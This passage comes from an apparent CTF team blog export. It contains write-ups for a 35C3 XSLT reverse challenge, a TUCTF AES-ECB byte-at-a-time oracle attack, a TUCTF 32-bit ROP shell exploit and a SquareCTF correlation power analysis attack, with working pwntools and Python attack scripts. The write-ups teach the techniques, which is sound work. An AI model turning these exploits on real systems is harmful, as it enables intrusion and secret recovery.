3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 317897225772103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599.... So after this I wrote a python script that reads this outputs and counts the length every number: 1234with open('out','r') as f: lines = f.readlines() for l in lines: print map(len,l.strip().split(' ')[:-5]) The output is something like this:123456789101112131415161718....[47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10]... From the outputs I analysed that when the single number had a length of 50, the chef-drinks would always have an equal length of 10, the other lengths diverged into different things so I decided to only extract the numbers if the single number has a length of 50. So now we need to create a xml file according with the info we just got, but it needs to be done dynamically at least of the part of the drinks, because we need to be really fast on the requests to get the same number it’s only possible if you do in a program. So the structure the xml solution we want to form needs to be something like this: 1234567891011121314151617181920212223242526272829303132&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;दाल&gt;4&lt;/दाल&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; We need 5 plates of Борщ because we need to reduce the count of chef-drinks to zero, and each iteration of Борщ will reduce the $chef-drinks by one, the final plate दाल is to finally print the flag, so I wrote two scripts to do this the first one is a simplified version of my bash script: 12var1=$(ncat 35.246.237.11 1 &lt; solution.xml | grep -Poh '\\d&#123;4,&#125;')echo $var1; Before the python script I prepared this xml file so I didn’t need to create every tag in python:12345678910111213141516171819202122232425262728&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;दाल&gt;4&lt;/दाल&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;/state&gt;&lt;/meal&gt; And finally my python script:1234567891011121314151617181920# -*- coding: utf-8 -*-import subprocessimport osimport xml.etree.ElementTree as ETtree = ET.parse('solution2.xml')root = tree.getroot()for x in xrange(100): a = subprocess.check_output(['bash','rofl.sh']).strip().split(' ') if (len(a[0]) == 50): state = root.getchildren()[1] for i in range(0,50,10): b = ET.SubElement(state,'drinks') b.text = a[0][i:i+10] break# create a new XML file with the resultsmydata = \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?&gt;\\n\"+ET.tostring(root, encoding=\"utf-8\") +'\\n\\n' myfile = open(\"items2.xml\", \"w\") myfile.write(mydata) And now running it all: 123$ bash -c \"python juggle.py &amp;&amp; ncat 35.246.237.11 1 &lt; items2.xml\"Reading input document from stdin...&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all&gt;&lt;flag&gt;35C3_The_chef_gives_you_his_compliments&lt;/flag&gt;&lt;/all&gt; The flag was 35C3_The_chef_gives_you_his_compliments","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"35C3","slug":"35C3","permalink":"https://teamrocketist.github.io/tags/35C3/"},{"name":"random","slug":"random","permalink":"https://teamrocketist.github.io/tags/random/"},{"name":"xslt","slug":"xslt","permalink":"https://teamrocketist.github.io/tags/xslt/"}]},{"title":"[Crypto] TUCTF 2018 - AESential Lesson","slug":"Crypto-TUCTF-2018-AESential-Lesson","date":"2018-11-26T06:51:39.000Z","updated":"2018-11-26T06:56:28.181Z","comments":true,"path":"2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/","link":"","permalink":"https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/","excerpt":"","text":"AESential Lesson465Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.nc 18.218.238.95 12345 Learning by the description we can already know the cryptography used here is AES ECB mode, we are provided a file with the encryption process: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python2from Crypto.Cipher import AESfrom select import selectimport sysINTRO = \"\"\"Lol. You think you can steal my flag?I\\'ll even encrypt your input for you,but you can\\'t get my secrets!\"\"\"flag = \"REDACTED\" # TODO Redact thiskey = \"REDACTED\" # TODO Redact thisif __name__ == '__main__': padc = 'REDACTED' #TODO Redact this assert (len(flag) == 32) and (len(key) == 32) cipher = AES.new(key, AES.MODE_ECB) sys.stdout.write(INTRO) sys.stdout.flush() while True: try: sys.stdout.write('Enter your text here: ') sys.stdout.flush() rlist, _, _ = select([sys.stdin], [], []) inp = '' if rlist: inp = sys.stdin.readline().rstrip('\\n') plaintext = inp + flag l = len(plaintext) padl = (l // 32 + 1)*32 if l % 32 != 0 else 0 plaintext = plaintext.ljust(padl, padc) #print plaintext sys.stdout.write('Here\\'s your encrypted text:\\n&#123;&#125;\\n\\n'.format((cipher.encrypt(plaintext)).encode('hex'))) except KeyboardInterrupt: exit(0) By looking at the script we can already see, the flag has 32 bytes of size, the key as well, the encryption method processes as follows, since it’s ECB we know the plaintext will be split in blocks of 16 bytes and for each block will be applied the AES encryption function with the key provided in the file: Before the encryption we can see the program asks for an input to be encrypted, the input is concatenated with the flag and then it’s applied some padding to fill the last blocks, for example imagine the padding character is 1, the sent input is ‘A’ and the respective flag is ‘TUCTF{MY_B34UT1FULL_FL4G_L0L_XD}’ the padding will be applied to the plaintext as follows: 12Block1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;111111111111111 1111111111111111 After this as described before the encryption is applied to each block with a key, now we can perform an attack without needing the key, we can bruteforce the flag byte by byte, imagine we sent an input of 15 ‘A’s the first block of the plaintext and ciphertext will be as follows (The key in this examples is a random key chosen by me): 12345678910PlaintextBlock1 Block2 Block3 Block4 AAAAAAAAAAAAAAAT UCTF&#123;MY_B34UT1FU L_FL4G_L0L_XD&#125;1 1111111111111111CiphertextBlock1 Block2 Block382b094debf0605ef9d46ad671ac3605d 08663b2c2a83bd539e14e2ea671035c4 b2140d0e9125ca1de2cd1ea85d21ae7e Block4e845fa5520b78d20bdd0ff93339df9fe Now we know that input + 1st_char_of_the_flag its corresponding ciphertext is the 1st block, now we just need to send the inputs for every character possible until we match the 1st ciphertext we got with the input of 14 “A”s: 123456Plain Block1 Cipher Block1AAAAAAAAAAAAAAAA 207ca0ee7f5bdb8897caa7b1f8ff2157AAAAAAAAAAAAAAAB 9884f8e45e5ea527ca6c9b090bef5e64AAAAAAAAAAAAAAAC e422f4ff06175cfe7e00b3002bd8b464 .... .......AAAAAAAAAAAAAAAT 82b094debf0605ef9d46ad671ac3605d As we can see from above we matched the 82b094debf0605ef9d46ad671ac3605d, we now know the first character of the flag is T, well we already knew that! but this was just a confirmation :), using this method we can get the first 16 bytes of the flag, but how can we get the last 16 ? For this we need to find the padding character we can do this by sending an A to the server, imagine the padding character is _: 123456789PlaintextBlock1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;_______________ ________________CiphertextBlock1 Block2 Block3 7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 Block4e845fa5520b78d20bdd0ff93339df9fe Now we want to extract the block 3 or the block 4 cipher, block 3 also works because we actually know that the last byte of the flag is }, so making an example using block 3 2a5831079c0a0591601f25278f4623f3 123456Plain Block1 Cipher Block1&#125;000000000000000 5f87ae73237e86dd625e820ba93056e0&#125;111111111111111 d9044a33bc1e523222289c56a6505c79&#125;222222222222222 774066300cda4278f32729b032a3bfe7 .... .......&#125;_______________ 2a5831079c0a0591601f25278f4623f3 Now that we have the padding character, we need to work something similar on how we got the 1st part of the flag, but now instead of comparing with the 1st block of the cipher we want to compare it with the 3rd block by sending an A we get the 3rd block cipher: 123456789PlaintextBlock1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;_______________ ________________CiphertextBlock1 Block2 Block3 7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 Block4e845fa5520b78d20bdd0ff93339df9fe Now we test all characters until we match this block3: 123456Plain Block1 Cipher Block10_______________ 545506ce0fa14673dba3d92a09a287741_______________ a26f177d5ef506e40e79411f4a1ef0bf2_______________ a4a7aee9adba7af7d709662da5c19aee .... .......&#125;_______________ 2a5831079c0a0591601f25278f4623f3 With this we get the last character of the flag, now repeat this for the rest of the characters, I’ll give one more example how to get the next character, sending “AA” as input: 123456789PlaintextBlock1 Block2 Block3 Block4AATUCTF&#123;MY_B34UT 1FULL_FL4G_L0L_X D&#125;______________ ________________CiphertextBlock1 Block2 Block3 6ca95659b3828138ff0408db597a6614 45551fa5b4b751017e717e2e4193cc8d 3c872cee5f361ca44e66a554602ee1c3 Block4e845fa5520b78d20bdd0ff93339df9fe Now brute force it like this: 123456Plain Block1 Cipher Block10&#125;______________ 6ef0fae728efd2738f1a5f179f6980a81&#125;______________ 2c851b1a58399ffdc6b1c4ed23287fa72&#125;______________ 664fafa0563cc1b84931daf6cf1cbc68 .... .......D&#125;______________ 3c872cee5f361ca44e66a554602ee1c3 Repeat this and you’ll get every character of the flag, the python script I implemented for this:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *import reimport stringimport timer = remote('18.218.238.95', 12345)#r = process('./redacted.py')print r.recvuntil('Enter your text here: ')flag = ''if flag == '': r.sendline('A'*15) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] for i in range(16): for c in string.printable: r.sendline('A'*(15-i) + flag+c) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[:32]: flag += c r.sendline('A'*(15-i-1)) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] breakpadding_char = ''if padding_char == '': r.sendline('A'*1) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] time.sleep(0.1) for x in string.printable: p = '&#125;'+ x*15 r.sendline(p) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[64:64+32]: padding_char = x breakr.sendline('&#125;'*1)encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0]flag_part2 = ''for i in range(16,0,-1): for c in string.printable: p = c+flag_part2 + (i-1)*padding_char r.sendline(p) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[64:64+32]: flag_part2 = c + flag_part2 r.sendline('A'*(17-i+1)) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] print flag+flag_part2 break Running it 12345678910111213141516171819python reeas.py [+] Starting local process './redacted.py': pid 11451Enter your text here: TUCTF&#123;A3S_3CB_1S&#125;TUCTF&#123;A3S_3CB_1S!&#125;TUCTF&#123;A3S_3CB_1S!!&#125;TUCTF&#123;A3S_3CB_1S!!!&#125;TUCTF&#123;A3S_3CB_1S!!!!&#125;TUCTF&#123;A3S_3CB_1S3!!!!&#125;TUCTF&#123;A3S_3CB_1SL3!!!!&#125;TUCTF&#123;A3S_3CB_1SBL3!!!!&#125;TUCTF&#123;A3S_3CB_1S4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SR4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1S3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SLN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SULN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SVULN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1S_VULN3R4BL3!!!!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"ecb","slug":"ecb","permalink":"https://teamrocketist.github.io/tags/ecb/"},{"name":"tuctf2018","slug":"tuctf2018","permalink":"https://teamrocketist.github.io/tags/tuctf2018/"}]},{"title":"[Pwn] TUCTF 2018 - Shella Hard","slug":"Pwn-TUCTF-2018-Shella-Hard","date":"2018-11-26T01:07:48.000Z","updated":"2018-11-26T01:14:52.585Z","comments":true,"path":"2018/11/26/Pwn-TUCTF-2018-Shella-Hard/","link":"","permalink":"https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/","excerpt":"","text":"Shella Hard475Difficulty: mind-melting hardThis program is crap! Is there even anything here?nc 3.16.169.157 12345 We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped Checking it’s security we can see we have NX enabled:1234567$ checksec shella-hard[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Now looking at the main function on radare2: We can easily see we have a buffer overflow here, the buf is located at ebp-0x10 and we are allowed to read up to 0x30 bytes with the read instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big rop chain, the binary is dynamic linked and the admins didn’t provide any libc file, even when not provided we can still use to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like printf, puts or even write. So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named giveShell, which uses execve: After calculating the offsets to the return address we get something like this:1234567891011121314151617181920212223from pwn import *import randomimport timedef getConn(): return process('./shella-hard', aslr=False, env=&#123;&#125;) if local else remote('3.16.169.157', 12345)local = Truedebug = Truecontext.terminal = ['tmux', 'new-window']binary = ELF('./shella-hard')GIVESHELL = 0x0804845cr = getConn()if debug: gdb.attach(r, \"\"\"b mainb *0x08048457b *0x08048467b *0x08048449c\"\"\")r.send('A'* 20 + p32(GIVESHELL))r.interactive() But as we can see it looks broken? the address 0x6a006a44 will make us to crash into a page fault, as we can see here on gdb if we try to jump immediately into that function: After loosing some time and trying another things I remembered reading a paper about a cool ROP technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example: 128049166: 66 90 xchg %ax,%ax8049168: 80 3c 1f c3 cmpb $0xc3,(%edi,%ebx,1) For example this could be a sample snippet from objdump. The first column is the address of the instruction. The second column is the hexadecimal code (machine code) of the x86 instruction. The last column is the assembly instruction itself, in ASCII human readable format, with mnemonic and operands etc. You can notice the presence of the value 0xc3 as the last byte of the second instruction. This value is really important because it happens to be the machine code for the “ret” instruction. So the trick here is to jump into the middle of this instruction: 1cmpb $0xc3,(%edi,%ebx,1) For instance at address 0x8049166a. The CPU would see the following machine code sequence:1f c3 Which will be interpreted as: 12300000000 &lt;.data&gt;: 0: 1f pop %ds 1: c3 ret Finding a hidden rop gadget, we can use the same idea in the function givenShell: 1234567891011121314/ (fcn) sym.giveShell 26| sym.giveShell ();| 0x08048458 55 push ebp| 0x08048459 89e5 mov ebp, esp| 0x0804845b 90 nop| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1| 0x08048461 006800 add byte [eax], ch| 0x08048464 850408 test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19| 0x08048467 e8b4feffff call sym.imp.execve| 0x0804846c 83c40c add esp, 0xc| 0x0804846f 90 nop| 0x08048470 c9 leave\\ 0x08048471 c3 ret[0x08048340]&gt; What I did was to jump into the middle of:1| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1 So lets see what happens what’s the “transformation” in radare if we jump into the middle: This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found. Now fixing our python script: 1234567891011121314$ python shella-hard.py[*] '/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[+] Starting local process './shella-hard': pid 1190[!] ASLR is disabled![*] Switching to interactive mode$ lscore flag output32 shella-hard shella-hard.py wtf.c$ cat flagflag&#123;test-flag-here&#125; No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"jump_middle_instruction","slug":"jump-middle-instruction","permalink":"https://teamrocketist.github.io/tags/jump-middle-instruction/"},{"name":"tuctf2018","slug":"tuctf2018","permalink":"https://teamrocketist.github.io/tags/tuctf2018/"}]},{"title":"[Crypto] SquareCtf 2018 - C4: leaky power","slug":"Crypto-SquareCtf-2018-C4-leaky-power","date":"2018-11-14T16:59:54.000Z","updated":"2018-11-14T17:22:56.511Z","comments":true,"path":"2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/","link":"","permalink":"https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/","excerpt":"","text":"C4: leaky power222C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is that enough?You’re given three files: powertraces.npy: Measurements (over time) of power consumption of a chip while performing AES encryption #: Corresponding plaintext inputs that were encrypted instructions.jwe: File encrypted using the same key as plaintexts.npy.note: The first two files are NumPy arrays.note: there’s a mistake in the way instructions.jwe was created (the algorithm is A128GCM, not A256GCM). The encryption used is AES, from reading the challenge description we know we eventually were able to monitor the powerlines having some power traces on powertraces.npy and the corresponding plaintexts used on plaintexts.npy, the ciphertext we want to decrypt is located at instructions.jwe. We have some power traces so we will need to use some kind of side-channel analysis: In CPA (Correlation power analysis) the goal is to accurately produce a power model of the device under attack. During an attack, the aim is to find Correlation between a predicted output and the actual power output of a device. If the power model is accurate then a strong correlation should be demonstrated between the predicted output and actual output. If this correlation is found then, gathering a large number of traces will enable one to show that the correctly predicted cipher key will demonstrate the highest level of correlation. One power model which may be used is the Hamming Weight Power Model. Traditionally, the Hamming weight of a value is the number of non-zeroes. For example, in the binary number 1100 0010 the Hamming weight would be 3. The assumption in using the Hamming Weight Power Model in power analysis attacks is that the number of bits set to 0 or 1 of an output is correlated with the power consumption of a device. The Hamming weight itself is then used as an arbitrary unit to model the consumption of power in a device. Hamming weight units can then be compared to the actual voltage levels of power traces captured when a device was performing cryptographic operations. This act of comparison is the process of finding correlation between the modelled power unit values and the actual power consumed. One technique to calculate correlation between the power model and the actual power consumption is to use Pearson correlation coefficient equation. In essence, this equation will take two sets data (X and Y) and calculate whether there is a linear (positive or negative) correlation between the two sets of values. We may use this equation to find significance in our power traces since the assumption with the Hamming Weight Power Model is that as the number of 1’s increase in our predicted output, so too does the power consumption increase in the actual output (and vice versa). Figure 1 - Pearson correlation coefficient equation AESAt the start of encryption, the plaintext values (the data to be encrypted) and the cipher key values (the key used for encryption and decryption purposes) will be each arranged into a 4×4 matrix in the positions as shown in Figure 2. Each value in this matrix holds 1 byte of data. During the AddRoundKey step, each plaintext value is XOR’d with a cipher key value at a matching position in the 4×4 matrix. Figure 2. Plaintext and cipher key arrangement. After AddRoundKey, the SubBytes step will use the result produced by Pi⊕ Ki as a lookup for a value stored in the Rijndael S-box. The S-box output will replace Pi⊕ Ki. The S-box is a 16×16 matrix of values which remains constant for all AES implementations. Each position in the 16×16 matrix will hold 1 byte of data.Figure 3 - Rijndael S-box For example if the result of Pi ⊕ Ki is c5 then we look for in the sbox table for the line c and the column 5 and we obtain the value a6. In the context of CPA attack implemented aim to exploit the fact that information may be leaked if one was to monitor the power consumption of a cryptographic device during the point in which the S-box lookup is carried out. Writing Python Script of CPABoth this files are numpy arrays, they can be loaded into python by using the numpy.load function: 123import numpy as nptraces = np.load('powertraces.npy')pt = np.load('plaintexts.npy') Now for each we want to create some hypothesis, the range is between 0x0 to 0xff (all possible bytes), this hypothesis are key guesses in which we will Xor them between with the plaintexts used and calculated it’s Hamming Weight : 1234567891011121314151617181920212223242526272829303132333435363738394041sbox=(0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16)def intermediate(pt, keyguess): return sbox[pt ^ keyguess]HW = [bin(n).count(\"1\") for n in range(0,256)]# Aes key is 16 bytes so for each best guessfor bnum in range(0, 16): cpaoutput = [0]*256 maxcpa = [0]*256 # for each keyguess for kguess in range(0, 256): print \"Subkey %2d, hyp = %02x: \"%(bnum, kguess), #Initialize arrays &amp; variables to zero sumnum = np.zeros(numpoint) sumden1 = np.zeros(numpoint) sumden2 = np.zeros(numpoint) hyp = np.zeros(numtraces) # calculate every hamming distance for all the traces for this key guess for tnum in range(0, numtraces): hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)] Now still in the same loop we want to calculate the means of the hypothesis and the points of the trace, this comes from the correlation formula in Figure 2.We can say that the two aleatory variable X and Y where X is the hamming distance of the key hypothesis for every character of plaintext tested and Y for every points power consumption points in every trace. So concluding the Xi in the formula is the first HW[intermediate(plaintext[x0][k0], kguess)] and yi is all the points in the power consumption trace, while x̅ is the mean of variable X and ȳ is the respective mean of variable Y. Calculation the means: 12345#Mean of hypothesismeanh = np.mean(hyp, dtype=np.float64)#Mean of all points in tracemeant = np.mean(traces, axis=0, dtype=np.float64) Now calculating the summations in the formula and performing the square root: 1234567891011#For each trace, do the followingfor tnum in range(0, numtraces): hdiff = (hyp[tnum] - meanh) tdiff = traces[tnum,:] - meant sumnum = sumnum + (hdiff*tdiff) sumden1 = sumden1 + hdiff*hdiff sumden2 = sumden2 + tdiff*tdiffcpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )maxcpa[kguess] = max(abs(cpaoutput[kguess])) So after calculating the correlation for every key guess the best guess key is the one with highest value of correlation: 